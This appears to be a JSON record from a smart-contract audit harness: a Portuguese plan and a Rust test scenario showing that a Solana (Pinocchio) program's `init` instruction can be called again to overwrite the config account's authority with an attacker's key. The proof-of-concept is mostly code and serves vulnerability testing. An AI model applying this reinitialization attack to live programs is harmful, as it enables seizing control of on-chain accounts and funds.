{
  "plan": "O programa `init` (Pinocchio) escreve incondicionalmente o discriminador, a autoridade, o byte de flag e o saldo em `config`, sem checar se a conta ja foi inicializada. O baseline chama `init` legitimamente sobre uma conta `config` vazia com a autoridade legitima, provando que o cenario esta montado corretamente. O ataque chama `init` novamente sobre a mesma conta `config` ja inicializada (estado vindo de `resulting_accounts`), mas com uma autoridade atacante diferente, tentando sobrescrever o estado. O efeito mede que apos o ataque a autoridade gravada em `data[8..40]` e a do atacante (diferente da autoridade legitima do baseline), demonstrando a reinitializacao e a tomada de controle.",
  "scenario": "let config_key = Pubkey::new_unique();
let authority_legit = Pubkey::new_unique();
let authority_attacker = Pubkey::new_unique();

let config_legit = account(&env.program_id, &[], None);
let authority_legit_acc = wallet(1_000_000_000);

let ix_baseline = env.raw_ix(&[0u8], &[
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_legit, false),
]);

let contas_baseline = vec![
    (config_key, config_legit.clone()),
    (authority_legit, authority_legit_acc.clone()),
];

let r_base = env.baseline("init legitimo sobre config vazia", &ix_baseline, &contas_baseline);

let config_pos_baseline = after(&r_base, &config_key).clone();

let ix_attack = env.raw_ix(&[0u8], &[
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_attacker, false),
]);

let contas_attack = vec![
    (config_key, config_pos_baseline),
    (authority_attacker, wallet(1_000_000_000)),
];

let r = env.attack("reinit sobre config ja inicializada com autoridade atacante", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let data_pos = after(&r, &config_key).data();
    let auth_pos = read_pubkey(data_pos, 8);
    env.effect("autoridade sobrescrita pelo atacante", auth_pos == authority_attacker);
    env.effect("autoridade legitima foi substituida", auth_pos != authority_legit);
}"
}

